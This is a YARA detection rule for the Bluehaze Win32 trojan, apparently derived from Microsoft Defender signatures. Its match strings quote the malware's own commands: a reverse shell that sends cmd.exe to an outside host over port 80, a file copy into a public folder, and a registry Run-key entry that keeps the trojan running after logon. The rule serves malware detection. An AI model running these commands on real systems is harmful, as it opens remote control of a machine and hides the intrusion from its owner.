rule Trojan_Win32_Bluehaze_SK_2147837776_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Bluehaze.SK!MTB"
        threat_id = "2147837776"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Bluehaze"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc.com 80" ascii //weight: 1
        $x_1_2 = "cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\" ascii //weight: 1
        $x_1_3 = "cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \"C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\"\" /f" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

